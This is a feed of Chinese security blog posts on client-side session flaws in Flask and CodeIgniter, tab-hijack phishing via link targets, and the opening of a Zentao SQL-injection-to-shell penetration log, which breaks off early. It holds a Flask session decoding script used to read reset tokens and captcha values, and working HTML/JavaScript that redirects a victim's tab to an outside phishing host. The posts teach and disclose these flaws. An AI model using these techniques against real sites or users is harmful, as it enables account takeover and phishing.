<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>长亭技术专栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/</link>
<description></description>
<language>zh-cn</language>
<lastBuildDate>Fri, 30 Mar 2018 04:41:48 +0800</lastBuildDate>
<item>
<title>客户端 session 导致的安全问题</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-26-34936378.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34936378&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-21b43848c8b14cf9e50e965b48ef5281_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在Web中，session是认证用户身份的凭证，它具备如下几个特点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;用户不可以任意篡改&lt;/li&gt;&lt;li&gt;A用户的session无法被B用户获取&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;也就是说，session的设计目的是为了做用户身份认证。但是，很多情况下，session被用作了别的用途，将产生一些安全问题，我们今天就来谈谈“客户端session”（client session）导致的安全问题。&lt;/p&gt;&lt;h2&gt;0x01 什么是客户端session&lt;/h2&gt;&lt;p&gt;在传统PHP开发中，&lt;code class=&quot;inline&quot;&gt;$_SESSION&lt;/code&gt;变量的内容默认会被保存在服务端的一个文件中，通过一个叫“PHPSESSID”的Cookie来区分用户。这类session是“服务端session”，用户看到的只是session的名称（一个随机字符串），其内容保存在服务端。&lt;/p&gt;&lt;p&gt;然而，并不是所有语言都有默认的session存储机制，也不是任何情况下我们都可以向服务器写入文件。所以，很多Web框架都会另辟蹊径，比如Django默认将session存储在数据库中，而对于flask这里并不包含数据库操作的框架，就只能将session存储在cookie中。&lt;/p&gt;&lt;p&gt;因为cookie实际上是存储在客户端（浏览器）中的，所以称之为“客户端session”。&lt;/p&gt;&lt;h2&gt;0x02 保护客户端session&lt;/h2&gt;&lt;p&gt;将session存储在客户端cookie中，最重要的就是解决session不能被篡改的问题。&lt;/p&gt;&lt;p&gt;我们看看flask是如何处理的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class SecureCookieSessionInterface(SessionInterface):
    &quot;&quot;&quot;The default session interface that stores sessions in signed cookies
    through the :mod:`itsdangerous` module.
    &quot;&quot;&quot;
    #: the salt that should be applied on top of the secret key for the
    #: signing of cookie based sessions.
    salt = &#39;cookie-session&#39;
    #: the hash function to use for the signature. The default is sha1
    digest_method = staticmethod(hashlib.sha1)
    #: the name of the itsdangerous supported key derivation. The default
    #: is hmac.
    key_derivation = &#39;hmac&#39;
    #: A python serializer for the payload. The default is a compact
    #: JSON derived serializer with support for some extra Python types
    #: such as datetime objects or tuples.
    serializer = session_json_serializer
    session_class = SecureCookieSession

    def get_signing_serializer(self, app):
        if not app.secret_key:
            return None
        signer_kwargs = dict(
            key_derivation=self.key_derivation,
            digest_method=self.digest_method
        )
        return URLSafeTimedSerializer(app.secret_key, salt=self.salt,
                                      serializer=self.serializer,
                                      signer_kwargs=signer_kwargs)

    def open_session(self, app, request):
        s = self.get_signing_serializer(app)
        if s is None:
            return None
        val = request.cookies.get(app.session_cookie_name)
        if not val:
            return self.session_class()
        max_age = total_seconds(app.permanent_session_lifetime)
        try:
            data = s.loads(val, max_age=max_age)
            return self.session_class(data)
        except BadSignature:
            return self.session_class()

    def save_session(self, app, session, response):
        domain = self.get_cookie_domain(app)
        path = self.get_cookie_path(app)
        # Delete case. If there is no session we bail early.
        # If the session was modified to be empty we remove the
        # whole cookie.
        if not session:
            if session.modified:
                response.delete_cookie(app.session_cookie_name,
                                       domain=domain, path=path)
            return
        # Modification case. There are upsides and downsides to
        # emitting a set-cookie header each request. The behavior
        # is controlled by the :meth:`should_set_cookie` method
        # which performs a quick check to figure out if the cookie
        # should be set or not. This is controlled by the
        # SESSION_REFRESH_EACH_REQUEST config flag as well as
        # the permanent flag on the session itself.
        if not self.should_set_cookie(app, session):
            return
        httponly = self.get_cookie_httponly(app)
        secure = self.get_cookie_secure(app)
        expires = self.get_expiration_time(app, session)
        val = self.get_signing_serializer(app).dumps(dict(session))
        response.set_cookie(app.session_cookie_name, val,
                            expires=expires, httponly=httponly,
                            domain=domain, path=path, secure=secure)&lt;/code&gt;&lt;p&gt;主要看最后两行代码，新建了&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;类 ，用它的&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;方法将类型为字典的session对象序列化成字符串，然后用&lt;code class=&quot;inline&quot;&gt;response.set_cookie&lt;/code&gt;将最后的内容保存在cookie中。&lt;/p&gt;&lt;p&gt;那么我们可以看一下&lt;code class=&quot;inline&quot;&gt;URLSafeTimedSerializer&lt;/code&gt;是做什么的：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;class Signer(object):
    # …
    def sign(self, value):
        &quot;&quot;&quot;Signs the given string.&quot;&quot;&quot;
        return value + want_bytes(self.sep) + self.get_signature(value)

    def get_signature(self, value):
        &quot;&quot;&quot;Returns the signature for the given value&quot;&quot;&quot;
        value = want_bytes(value)
        key = self.derive_key()
        sig = self.algorithm.get_signature(key, value)
        return base64_encode(sig)


class Serializer(object):
    default_serializer = json
    default_signer = Signer
    # ….
    def dumps(self, obj, salt=None):
        &quot;&quot;&quot;Returns a signed string serialized with the internal serializer.
        The return value can be either a byte or unicode string depending
        on the format of the internal serializer.
        &quot;&quot;&quot;
        payload = want_bytes(self.dump_payload(obj))
        rv = self.make_signer(salt).sign(payload)
        if self.is_text_serializer:
            rv = rv.decode(&#39;utf-8&#39;)
        return rv

    def dump_payload(self, obj):
        &quot;&quot;&quot;Dumps the encoded object. The return value is always a
        bytestring. If the internal serializer is text based the value
        will automatically be encoded to utf-8.
        &quot;&quot;&quot;
        return want_bytes(self.serializer.dumps(obj))


class URLSafeSerializerMixin(object):
    &quot;&quot;&quot;Mixed in with a regular serializer it will attempt to zlib compress
    the string to make it shorter if necessary. It will also base64 encode
    the string so that it can safely be placed in a URL.
    &quot;&quot;&quot;
    def load_payload(self, payload):
        decompress = False
        if payload.startswith(b&#39;.&#39;):
            payload = payload[1:]
            decompress = True
        try:
            json = base64_decode(payload)
        except Exception as e:
            raise BadPayload(&#39;Could not base64 decode the payload because of &#39;
                &#39;an exception&#39;, original_error=e)
        if decompress:
            try:
                json = zlib.decompress(json)
            except Exception as e:
                raise BadPayload(&#39;Could not zlib decompress the payload before &#39;
                    &#39;decoding the payload&#39;, original_error=e)
        return super(URLSafeSerializerMixin, self).load_payload(json)

    def dump_payload(self, obj):
        json = super(URLSafeSerializerMixin, self).dump_payload(obj)
        is_compressed = False
        compressed = zlib.compress(json)
        if len(compressed) &amp;lt; (len(json) - 1):
            json = compressed
            is_compressed = True
        base64d = base64_encode(json)
        if is_compressed:
            base64d = b&#39;.&#39; + base64d
        return base64d


class URLSafeTimedSerializer(URLSafeSerializerMixin, TimedSerializer):
    &quot;&quot;&quot;Works like :class:`TimedSerializer` but dumps and loads into a URL
    safe string consisting of the upper and lowercase character of the
    alphabet as well as ``&#39;_&#39;``, ``&#39;-&#39;`` and ``&#39;.&#39;``.
    &quot;&quot;&quot;
    default_serializer = compact_json&lt;/code&gt;&lt;p&gt;主要关注&lt;code class=&quot;inline&quot;&gt;dump_payload&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;dumps&lt;/code&gt;，这是序列化session的主要过程。&lt;/p&gt;&lt;p&gt;可见，序列化的操作分如下几步：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;json.dumps 将对象转换成json字符串，作为数据&lt;/li&gt;&lt;li&gt;如果数据压缩后长度更短，则用zlib库进行压缩&lt;/li&gt;&lt;li&gt;将数据用base64编码&lt;/li&gt;&lt;li&gt;通过hmac算法计算数据的签名，将签名附在数据后，用“.”分割&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;第4步就解决了用户篡改session的问题，因为在不知道secret_key的情况下，是无法伪造签名的。&lt;/p&gt;&lt;p&gt;最后，我们在cookie中就能看到设置好的session了：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-310bda7796d4d07ae78abb4813d76b6a_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;552&quot; data-rawheight=&quot;295&quot;&gt;&lt;p&gt;注意到，在第4步中，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。&lt;/p&gt;&lt;h2&gt;0x03 flask客户端session导致敏感信息泄露&lt;/h2&gt;&lt;p&gt;我曾遇到过一个案例，目标是flask开发的一个简历管理系统，在测试其找回密码功能的时候，我收到了服务端设置的session。&lt;/p&gt;&lt;p&gt;我在0x02中说过，flask是一个客户端session，所以看目标为flask的站点的时候，我习惯性地去解密其session。编写如下代码解密session：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b&#39;.&#39;, 1)
    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)

    decompress = False
    if payload.startswith(b&#39;.&#39;):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception(&#39;Could not base64 decode the payload because of &#39;
                         &#39;an exception&#39;)

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception(&#39;Could not zlib decompress the payload before &#39;
                             &#39;decoding the payload&#39;)

    return session_json_serializer.loads(payload)

if __name__ == &#39;__main__&#39;:
    print(decryption(sys.argv[1].encode()))&lt;/code&gt;&lt;p&gt;例如，我解密0x02中演示的session：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-429c5066ae1eecc810a94c75d231d665_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;723&quot; data-rawheight=&quot;41&quot;&gt;&lt;p&gt;通过解密目标站点的session，我发现其设置了一个名为token、值是一串md5的键。猜测其为找回密码的认证，将其替换到找回密码链接的token中，果然能够进入修改密码页面。通过这个过程，我就能修改任意用户密码了。&lt;/p&gt;&lt;p&gt;这是一个比较典型的安全问题，目标网站通过session来储存随机token并认证用户是否真的在邮箱收到了这个token。但因为flask的session是存储在cookie中且仅签名而未加密，所以我们就可以直接读取这个token了。&lt;/p&gt;&lt;h2&gt;0x04 flask验证码绕过漏洞&lt;/h2&gt;&lt;p&gt;这是客户端session的另一个常见漏洞场景。&lt;/p&gt;&lt;p&gt;我们用一个实际例子认识这一点：&lt;a href=&quot;https://github.com/shonenada/flask-captcha&quot;&gt;https://github.com/shonenada/flask-captcha&lt;/a&gt; 。这是一个为flask提供验证码的项目，我们看到其中的view文件：&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import random
try:
    from cStringIO import StringIO
except ImportError:
    from io import BytesIO as StringIO

from flask import Blueprint, make_response, current_app, session
from wheezy.captcha.image import captcha
from wheezy.captcha.image import background
from wheezy.captcha.image import curve
from wheezy.captcha.image import noise
from wheezy.captcha.image import smooth
from wheezy.captcha.image import text
from wheezy.captcha.image import offset
from wheezy.captcha.image import rotate
from wheezy.captcha.image import warp


captcha_bp = Blueprint(&#39;captcha&#39;, __name__)


def sample_chars():
    characters = current_app.config[&#39;CAPTCHA_CHARACTERS&#39;]
    char_length = current_app.config[&#39;CAPTCHA_CHARS_LENGTH&#39;]
    captcha_code = random.sample(characters, char_length)
    return captcha_code

@captcha_bp.route(&#39;/captcha&#39;, endpoint=&quot;captcha&quot;)
def captcha_view():
    out = StringIO()
    captcha_image = captcha(drawings=[
        background(),
        text(fonts=current_app.config[&#39;CAPTCHA_FONTS&#39;],
             drawings=[warp(), rotate(), offset()]),
        curve(),
        noise(),
        smooth(),
    ])
    captcha_code = &#39;&#39;.join(sample_chars())
    imgfile = captcha_image(captcha_code)
    session[&#39;captcha&#39;] = captcha_code
    imgfile.save(out, &#39;PNG&#39;)
    out.seek(0)
    response = make_response(out.read())
    response.content_type = &#39;image/png&#39;
    return response&lt;/code&gt;&lt;p&gt;可见，其生成验证码后，就存储在session中了：&lt;code class=&quot;inline&quot;&gt;session[&#39;captcha&#39;] = captcha_code&lt;/code&gt;。&lt;/p&gt;&lt;p&gt;我们用浏览器访问&lt;code class=&quot;inline&quot;&gt;/captcha&lt;/code&gt;，即可得到生成好的验证码图片，此时复制保存在cookie中的session值，用0x03中提供的脚本进行解码：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-b6399058172ffe4b393e6da2df5bb9bd_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1496&quot; data-rawheight=&quot;697&quot;&gt;&lt;p&gt;可见，我成功获取了验证码的值，进而可以绕过验证码的判断。&lt;/p&gt;&lt;p&gt;这也是客户端session的一种错误使用方法。&lt;/p&gt;&lt;h2&gt;0x05 CodeIgniter 2.1.4 session伪造及对象注入漏洞&lt;/h2&gt;&lt;p&gt;Codeigniter 2的session也储存在session中，默认名为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;，默认值如下：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-e5edf0893d4da488de1ace08380c8635_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1484&quot; data-rawheight=&quot;655&quot;&gt;&lt;p&gt;可见，session数据被用PHP自带的serialize函数进行序列化，并签名后作为&lt;code class=&quot;inline&quot;&gt;ci_session&lt;/code&gt;的值。原理上和flask如出一辙，我就不重述了。但好在codeigniter2支持对session进行加密，只需在配置文件中设置&lt;code class=&quot;inline&quot;&gt;$config[&#39;sess_encrypt_cookie&#39;] = TRUE;&lt;/code&gt;即可。&lt;/p&gt;&lt;p&gt;在CI2.1.4及以前的版本中，存在一个弱加密漏洞（ &lt;a href=&quot;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&quot;&gt;https://www.dionach.com/blog/codeigniter-session-decoding-vulnerability&lt;/a&gt; ），如果目标环境中没有安装Mcrypt扩展，则CI会使用一个相对比较弱的加密方式来处理session:&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function _xor_encode($string, $key)
{
 $rand = &#39;&#39;;
 while (strlen($rand) &amp;lt; 32)
 {
  $rand .= mt_rand(0, mt_getrandmax());
 }
 $rand = $this-&amp;gt;hash($rand);
 $enc = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $enc .= substr($rand, ($i % strlen($rand)), 1).(substr($rand, ($i % strlen($rand)), 1) ^ substr($string, $i, 1));
 }
 return $this-&amp;gt;_xor_merge($enc, $key);
}

function _xor_merge($string, $key)
{
 $hash = $this-&amp;gt;hash($key);
 $str = &#39;&#39;;
 for ($i = 0; $i &amp;lt; strlen($string); $i++)
 {
  $str .= substr($string, $i, 1) ^ substr($hash, ($i % strlen($hash)), 1);
 }
 return $str;
}&lt;/code&gt;&lt;p&gt;其中用到了&lt;code class=&quot;inline&quot;&gt;mt_rand&lt;/code&gt;、异或等存在大量缺陷的方法。我们通过几个简单的脚本（ &lt;a href=&quot;https://github.com/Dionach/CodeIgniterXor&quot;&gt;https://github.com/Dionach/CodeIgniterXor&lt;/a&gt; ），即可在4秒到4分钟的时间，破解CI2的密钥。&lt;/p&gt;&lt;p&gt;获取到了密钥，我们即可篡改任意session，并自己签名及加密，最后伪造任意用户，注入任意对象，甚至通过反序列化操作造成更大的危害。&lt;/p&gt;&lt;h2&gt;0x06 总结&lt;/h2&gt;&lt;p&gt;我以三个案例来说明了客户端session的安全问题。&lt;/p&gt;&lt;p&gt;上述三个问题，如果session是储存在服务器文件或数据库中，则不会出现。当然，考虑到flask和ci都是非常轻量的web框架，很可能运行在无法操作文件系统或没有数据库的服务器上，所以客户端session是无法避免的。&lt;/p&gt;&lt;p&gt;除此之外，我还能想到其他客户端session可能存在的安全隐患：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;签名使用hash函数而非hmac函数，导致利用hash长度扩展攻击来伪造session&lt;/li&gt;&lt;li&gt;任意文件读取导致密钥泄露，进一步造成身份伪造漏洞或反序列化漏洞（ &lt;a href=&quot;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&quot;&gt;http://www.loner.fm/drops/#!/drops/227.Codeigniter%20%E5%88%A9%E7%94%A8%E5%8A%A0%E5%AF%86Key%EF%BC%88%E5%AF%86%E9%92%A5%EF%BC%89%E7%9A%84%E5%AF%B9%E8%B1%A1%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E&lt;/a&gt; ）&lt;/li&gt;&lt;li&gt;如果客户端session仅加密未签名，利用CBC字节翻转攻击，我们可以修改加密session中某部分数据，来达到身份伪造的目的&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;上面说的几点，各位CTF出题人可以拿去做文章啦~嘿嘿。&lt;/p&gt;&lt;p&gt;相对的，作为一个开发者，如果我们使用的web框架或web语言的session是存储在客户端中，那就必须牢记下面几点：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;没有加密时，用户可以看到完整的session对象&lt;/li&gt;&lt;li&gt;加密/签名不完善或密钥泄露的情况下，用户可以修改任意session&lt;/li&gt;&lt;li&gt;使用强健的加密及签名算法，而不是自己造（反例discuz）&lt;/li&gt;&lt;/ol&gt;</description>
<author>周佩雨</author>
<guid isPermaLink="false">2018-03-26-34936378</guid>
<pubDate>Mon, 26 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>前端黑魔法之远程控制地址栏</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-13-34495488.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34495488&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-33395718b82a3db6e77cea8f881e7528_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;作者： &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hash=&quot;6f8ffd80705c262c2ee3fa4d9b3f8f06&quot; data-hovercard=&quot;p$b$6f8ffd80705c262c2ee3fa4d9b3f8f06&quot;&gt;@周佩雨&lt;/a&gt;&lt;/p&gt;&lt;p&gt;[ Phith0n，现就职于长亭科技，长期关注并笔耕于安全编码、代码审计等方向]&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于今天看到一篇文章《&lt;a href=&quot;https://paper.seebug.org/538/&quot;&gt;危险的 target=&quot;_blank&quot; 与 “opener”&lt;/a&gt;》，里面提到了一个老知识点，就是target=&quot;_blank&quot;的时候，新打开的页面可以通过window.opener来控制源页面的URL，进行钓鱼攻击。这个攻击手法我在博客《&lt;a href=&quot;https://www.leavesongs.com/HTML/opener-fishing.html&quot;&gt;神奇的opener对象&lt;/a&gt;》中也说过，这里就不再赘述了。这篇文章抛出另一种与target有关的钓鱼攻击。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x01&quot;&gt;0x01 效果演示&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以看一个小例子：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://675ba661.2m1.pw/41593a&quot;&gt;http://675ba661.2m1.pw/41593a&lt;/a&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_r.gif&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1154&quot; data-rawheight=&quot;764&quot; data-thumbnail=&quot;https://pic3.zhimg.com/v2-90a98df05aa9c08b04f362421c4d3651_b.jpg&quot;&gt;&lt;p&gt;打开上述链接，然后点击“click me”，打开了百度。这时查看地址栏，的的确确是百度，然后我们等待10秒，再次查看地址栏，这个时候已经变成攻击者的网址了；即使此时我们再访问淘宝等页面，只要仍然在这个标签页下，地址栏就仍然会被控制。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x02&quot;&gt;0x02 原理说明&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;上述页面的代码也很简单：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    setInterval(function() {
        baidu.href=&quot;http://675ba661.2m1.pw/baidu&quot;;
        baidu.click();
    }, 10000);
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;如果用户点击了超链接“click me”，这里会启动一个循环定时器，每过10秒钟，将会将超链接的地址更换成一个仿百度的钓鱼网站，并再次点击。（当然，如果是真实攻击的话，最好是做一个真实目标的反代服务器，这个在我另一篇文章《&lt;a href=&quot;https://www.leavesongs.com/SOFT/play-with-openresty-lua-web.html&quot;&gt;openresty+lua在反向代理服务中的玩法&lt;/a&gt;》中也有详细的介绍）。&lt;/p&gt;&lt;p&gt;这里，超链接的target属性指定目标URL在哪个页面下打开，就是目标页面的window.name。如果这个a标签的href发生了变化，再次点击链接，页面仍然会在相同的标签页下打开，所以就覆盖了上一次打开的页面。&lt;/p&gt;&lt;p&gt;比如，我们是一个“网址导航”类型的恶意网站，用户在我们网站上打开了百度、淘宝等标签页面，我们将可以根据用户打开的超链接来生成钓鱼页面，伪造这些网站的登录页面，精准地进行钓鱼。我这里就不进行演示了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x03&quot;&gt;0x03 扩展尝试&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;除了超链接以外，用window.open也可以达到一样的效果：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;javascript:;&quot; onclick=&quot;return start()&quot;&amp;gt;click me&amp;lt;/a&amp;gt;

&amp;lt;script&amp;gt;
function start() {
    var w = window.open(&#39;https://www.baidu.com&#39;, &#39;baidu&#39;);
    setInterval(function() {
        w.location = &#39;http://675ba661.2m1.pw/baidu&#39;
    }, 5000)
}
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;不过，window.open经常会被广告拦截相关的功能给阻止掉，所以可能效果不如直接用超链接。&lt;/p&gt;&lt;p&gt;那么，继续深入研究。这个现象究竟是否和window.name有关呢？那么是不是我们知道了某个页面的name，即可对其页面的URL进行控制？&lt;/p&gt;&lt;p&gt;我们可以做一个实验。编写A页面（ &lt;a href=&quot;http://a.675ba661.2m1.pw/A_victim&quot;&gt;http://a.675ba661.2m1.pw/A_victim&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;p&amp;gt;Hello world.&amp;lt;/p&amp;gt;
&amp;lt;script&amp;gt;
window.name = &#39;baidu&#39;;
&amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;编写B页面（ &lt;a href=&quot;http://b.675ba661.2m1.pw/B_attacker&quot;&gt;http://b.675ba661.2m1.pw/B_attacker&lt;/a&gt; ）：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;&amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
&amp;lt;a href=&quot;https://www.baidu.com&quot; target=&quot;baidu&quot; id=&quot;baidu&quot;&amp;gt;click me&amp;lt;/a&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;p&gt;A页面是目标网站，其中设置自己的name是baidu；B是攻击者的页面，其中设置&lt;code class=&quot;inline&quot;&gt;target=&quot;baidu&quot;&lt;/code&gt; &lt;/p&gt;&lt;p&gt;显然，我们在B中点击“click me”以后，会打开一个新的页面，而不是修改A页面的URL。这个实验说明，URL的远程控制和window.name没有直接关系，而是和页面的父子关系有关。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/use-target-to-spoof-fishing.html#0x04&quot;&gt;0x04 总结&lt;/a&gt;&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本文所描述的攻击方式和opener的攻击方式比较相似，都是在不能跨域的情况下，控制目标标签页的URL，进而进行钓鱼攻击。&lt;/p&gt;&lt;p&gt;但我觉得这个攻击持久型更佳，因为即使用户在新标签中输入自己的域名，或者又通过超链接点击到其他网站里，这个页面的地址栏永远是受到源页面的控制的。理论上在源页面不关闭的情况下，可以永久控制新页面的地址栏。&lt;/p&gt;</description>
<author>小蘑菇</author>
<guid isPermaLink="false">2018-03-13-34495488</guid>
<pubDate>Tue, 13 Mar 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>从SQL注入到Getshell：记一次禅道系统的渗透</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-03-07-34275981.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/34275981&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-c9c286b86cab690e0da2551d738fc1d1_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：&lt;/b&gt; &lt;a class=&quot;member_mention&quot; href=&quot;https://www.zhihu.com/people/03f40f07ca96c5b31c8892400eec8c1d&quot; data-hash=&quot;03f40f07ca96c5b31c8892400eec8c1d&quot; data-hovercard=&quot;p$b$03f40f07ca96c5b31c8892400eec8c1d&quot;&gt;@L3m0n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;此过程为某站点的渗透记录，过程一波三折，但归根结底都是粗心大意造成的，不过自我认为在这个排坑的过程中也学习到了很多。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;确认版本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;首先可以通过接口来确认一下当前禅道的版本。&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;http://example.com/index.php?mode=getconfig&lt;/code&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-c6d7fb7d4b2d437eb33d3644630813b4_r.jpg&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1582&quot;&gt;&lt;h2&gt;&lt;b&gt;SQL注入分析&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;网上之前有过一个&lt;code class=&quot;inline&quot;&gt;9.1.2&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数的分析，但是没想到&lt;code class=&quot;inline&quot;&gt;9.2.1&lt;/code&gt;也存在此问题，(&lt;code class=&quot;inline&quot;&gt;2018.3.2&lt;/code&gt;号看到目前最新版本是&lt;code class=&quot;inline&quot;&gt;9.8.1&lt;/code&gt;)。&lt;/p&gt;&lt;p&gt;出问题的地方是此文件的&lt;code class=&quot;inline&quot;&gt;orderBy&lt;/code&gt;函数：\lib\base\dao\dao.class.php&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;public function orderBy($order)
{
    if($this-&amp;gt;inCondition and !$this-&amp;gt;conditionIsTrue) return $this;

    $order = str_replace(array(&#39;|&#39;, &#39;&#39;, &#39;_&#39;), &#39; &#39;, $order);

    /* Add &quot;`&quot; in order string. */
    /* When order has limit string. */
    $pos    = stripos($order, &#39;limit&#39;);
    $orders = $pos ? substr($order, 0, $pos) : $order;
    $limit  = $pos ? substr($order, $pos) : &#39;&#39;;
    $orders = trim($orders);
    if(empty($orders)) return $this;
    if(!preg_match(&#39;/^(\w+\.)?(`\w+`|\w+)( +(desc|asc))?( *(, *(\w+\.)?(`\w+`|\w+)( +(desc|asc))?)?)*$/i&#39;, $orders)) die(&quot;Order is bad request, The order is $orders&quot;);

